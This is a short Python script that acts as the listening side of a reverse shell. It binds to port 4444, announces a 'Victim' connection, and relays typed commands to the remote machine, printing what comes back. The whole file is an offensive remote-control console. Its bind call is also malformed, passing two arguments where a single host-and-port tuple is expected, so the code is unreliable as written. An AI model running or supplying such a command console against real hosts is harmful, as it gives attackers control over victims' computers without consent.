import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind("0.0.0.0",4444)
server.listen(5)

print("[+] Server is listening...")


client_socket, client_address = server.accept()
print(f"[+] Victim connected from {client_address}")

while True:
    command = input("Enter command: ")
    client_socket.send(command.encode())
    response = client_socket.recv(4096).decode()
    print(response)